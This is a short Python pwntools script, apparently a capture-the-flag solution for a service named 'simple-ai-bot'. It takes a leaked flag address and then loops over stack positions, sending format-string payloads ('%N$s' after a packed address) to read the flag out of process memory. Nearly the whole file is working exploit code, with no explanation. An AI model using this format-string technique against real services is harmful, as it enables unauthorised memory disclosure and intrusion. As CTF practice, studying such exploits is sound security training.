from pwn import *

r = remote("simple-ai-bot.ctf.zone", 4242)

indx = 7
print(r.recvline())
payload = b"flag"
r.sendline(payload)
flagg = r.recvline()
if "safely" in flagg.decode():
    flag_adrs = flagg.decode().split("in")[-1].strip(" ")
    flag_adrs = int(flag_adrs, 16)
    print(flag_adrs)
while True:
    payload = p64(flag_adrs) + f"%{indx}$s".encode()
    r.sendline(payload)
    line = r.recvline()
    print(line)
    # if "about" in line.decode():    
    #     bts = line.decode().split(":")[-1].strip(" ")
    #     bts = int(bts, 16)
    #     bts = p64(bts)
    #     print("bytes " + repr(bts))
    indx += 1
    time.sleep(0.3)
    if indx == 1000 :
        break